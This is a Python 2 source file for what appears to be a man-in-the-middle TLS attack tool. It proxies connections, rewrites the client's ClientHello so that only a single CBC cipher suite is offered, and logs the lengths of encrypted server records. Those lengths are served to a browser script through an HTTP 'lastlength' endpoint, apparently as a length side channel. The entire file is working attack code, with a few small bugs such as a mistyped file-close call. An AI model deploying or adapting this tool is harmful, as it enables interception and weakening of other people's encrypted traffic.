import socket,asyncore
import struct
import sys
import thread
import BaseHTTPServer
import urlparse

lastTLSApplicationPacketLength = 0
TRY_DOWNGRADE_TLS = False

class ClientTLSParser():
    def __init__(self):
        self.tlsBuffer = ''

    def parse(self, newData):
        if TRY_DOWNGRADE_TLS == True:
            self.tlsBuffer += newData
            return self.parsePacket()
        else:
            return newData
    
    def parsePacket(self):
        readyData = ''
        while True:
            tlsBufferLength = len(self.tlsBuffer) 
            
            if tlsBufferLength < 5:
                break

            tlsHeader = self.tlsBuffer[0:5]
            contentType, tlsVersion, packetLength, = struct.unpack('!BHH', tlsHeader)
            if tlsBufferLength < packetLength + 5:
                break

            packetData = self.tlsBuffer[5: 5 + packetLength]

            readyData += self.processPacket(contentType, tlsVersion, packetData)

            self.tlsBuffer = self.tlsBuffer[packetLength + 5:]

        return readyData

    def processPacket(self, contentType, tlsVersion, packetData):
        if contentType == 22:
            # Handshake
            handshakeType, = struct.unpack('!B', packetData[0])
            if handshakeType == 1:
                # Client Hello
                packetData = self.downgradeClientHello(packetData)

        return struct.pack('!BHH', contentType, tlsVersion, len(packetData)) + packetData

    def downgradeClientHello(self, packetData):
        cipherSuitesLengthString = packetData[71: 71+2]
        cipherSuitesLength, = struct.unpack('!H', cipherSuitesLengthString)

        newCipherSuitesLength = 2
        newCipherSuitesString = '\xc0\x14'
        newCipherSuitesBlock = struct.pack('!H', newCipherSuitesLength) + newCipherSuitesString
        newCipherSuitesBlockLength = len(newCipherSuitesBlock)

        downgradeLength = len(packetData) - 4 - cipherSuitesLength - 2 + newCipherSuitesBlockLength
        downgradeLengthHigh = 0
        downgradeLengthLow = downgradeLength
        if downgradeLengthLow > 0xffff:
            downgradeLengthHigh = (downgradeLengthLow >> 16) & 0xff
            downgradeLengthLow = (downgradeLengthLow & 0xffff)
        downgradeLengthString = struct.pack('!BH', downgradeLengthHigh, downgradeLengthLow)
        
        downgradeClientHello = packetData[0] + downgradeLengthString + packetData[4:71] + newCipherSuitesBlock + packetData[71+2+cipherSuitesLength:]
        
        return downgradeClientHello
        #return packetData

class ServerTLSParser():
    def __init__(self):
        self.tlsBuffer = ''

    def parse(self, newData):
        self.tlsBuffer += newData
        self.parsePacket()
    
    def parsePacket(self):
        while True:
            tlsBufferLength = len(self.tlsBuffer) 
            
            if tlsBufferLength < 5:
                break

            contentType, tlsVersion, packetLength = struct.unpack('!BHH', self.tlsBuffer[0:5])
            if tlsBufferLength < packetLength + 5:
                break

            packetData = self.tlsBuffer[5: 5+packetLength]

            self.tlsBuffer = self.tlsBuffer[packetLength + 5:]

            self.processPacket(contentType, tlsVersion, packetLength, packetData)

    def processPacket(self, contentType, tlsVersion, packetLength, packetData):
        global lastTLSApplicationPacketLength
        if contentType == 23:
            # Application Data
            lastTLSApplicationPacketLength += packetLength
            #print packetData.encode('hex')
            print '<'*20 
            print 'Content Type: ', contentType
            print 'Verion: ', tlsVersion
            print 'Length: ', packetLength
            print ''

class forwarder(asyncore.dispatcher):
    def __init__(self, ip, port, remoteip,remoteport,backlog=5):
        asyncore.dispatcher.__init__(self)
        self.remoteip=remoteip
        self.remoteport=remoteport
        self.create_socket(socket.AF_INET,socket.SOCK_STREAM)
        self.set_reuse_addr()
        self.bind((ip,port))
        self.listen(backlog)

    def handle_accept(self):
        conn, addr = self.accept()
        # print '--- Connect --- '
        sender(receiver(conn),self.remoteip,self.remoteport)

class receiver(asyncore.dispatcher):
    def __init__(self,conn):
        asyncore.dispatcher.__init__(self,conn)
        self.from_remote_buffer=''
        self.to_remote_buffer=''
        self.sender=None
        self.clientTlsParser = ClientTLSParser()

    def handle_connect(self):
        pass

    def handle_read(self):
        read = self.recv(4096)
        # print '%04i -->'%len(read)
        data = self.clientTlsParser.parse(read)
        self.from_remote_buffer += data

    def writable(self):
        return (len(self.to_remote_buffer) > 0)

    def handle_write(self):
        sent = self.send(self.to_remote_buffer)
        # print '%04i <--'%sent
        self.to_remote_buffer = self.to_remote_buffer[sent:]

    def handle_close(self):
        self.close()
        if self.sender:
            self.sender.close()

class sender(asyncore.dispatcher):
    def __init__(self, receiver, remoteaddr,remoteport):
        asyncore.dispatcher.__init__(self)
        self.receiver=receiver
        receiver.sender=self
        self.create_socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connect((remoteaddr, remoteport))
        self.serverTlsParser = ServerTLSParser()

    def handle_connect(self):
        pass

    def handle_read(self):
        read = self.recv(4096)
        # print '<-- %04i'%len(read)
        self.serverTlsParser.parse(read)
        self.receiver.to_remote_buffer += read

    def writable(self):
        return (len(self.receiver.from_remote_buffer) > 0)

    def handle_write(self):
        sent = self.send(self.receiver.from_remote_buffer)
        # print '--> %04i'%sent
        self.receiver.from_remote_buffer = self.receiver.from_remote_buffer[sent:]

    def handle_close(self):
        self.close()
        self.receiver.close()

class HttpHandler(BaseHTTPServer.BaseHTTPRequestHandler):
    def do_GET(self):
        requestURL = urlparse.urlparse(self.path)
        params = urlparse.parse_qs(requestURL.query)
        if 'type' in params:
            requestType = params['type'][0] 
        else:
            requestType = 'blank' 

        if requestType == 'init':
            self.initPage()
        elif requestType == 'jquery':
            self.sendJQuery()
        elif requestType == 'app':
            self.sendAppJS()
        elif requestType == 'lastlength':
            self.sendLastLength()
        else:
            self.sendWelcomePage()
 
    def do_POST(self):
        self.process()

    def sendPage(self, content):
        self.send_response(200)
        self.send_header("Content-Length", str(len(content)))
        self.end_headers()
        self.wfile.write(content)

    def sendWelcomePage(self):
        self.sendFile('welcome.html')

    def sendFile(self, fileName):
        content = 'can not open file'
        try:
            f = open(fileName, 'r')
            content = f.read()
            c.close()
        except:
            pass
        self.sendPage(content)

    def initPage(self):
        self.sendFile('init.html')

    def sendJQuery(self):
        self.sendFile('jquery.js')

    def sendAppJS(self):
        self.sendFile('app.js')

    def sendLastLength(self):
        global lastTLSApplicationPacketLength
        content = '{"lastLength": ' + str(lastTLSApplicationPacketLength) + '}'
        lastTLSApplicationPacketLength = 0
        self.sendPage(content)

def HttpServer(localIP, localPort):
    ServerClass  = BaseHTTPServer.HTTPServer
     
    #print 'Http Server: ', localIP, ':', localPort
    httpServer = BaseHTTPServer.HTTPServer((localIP, localPort), HttpHandler)
     
    httpServer.serve_forever()

if __name__=='__main__':
    import optparse
    parser = optparse.OptionParser()

    parser.add_option(
        '-l','--local-ip',
        dest='local_ip',default='127.0.0.1',
        help='Local IP address to bind to')
    parser.add_option(
        '-p','--local-port',
        type='int',dest='local_port',default=80,
        help='Local port to bind to')
    parser.add_option(
        '-r','--remote-ip',dest='remote_ip',
        help='Local IP address to bind to')
    parser.add_option(
        '-P','--remote-port',
        type='int',dest='remote_port',default=80,
        help='Remote port to bind to')
    options, args = parser.parse_args()

    thread.start_new_thread(HttpServer, (options.local_ip, 80))
    forwarder(options.local_ip,options.local_port,options.remote_ip,options.remote_port)
    asyncore.loop()

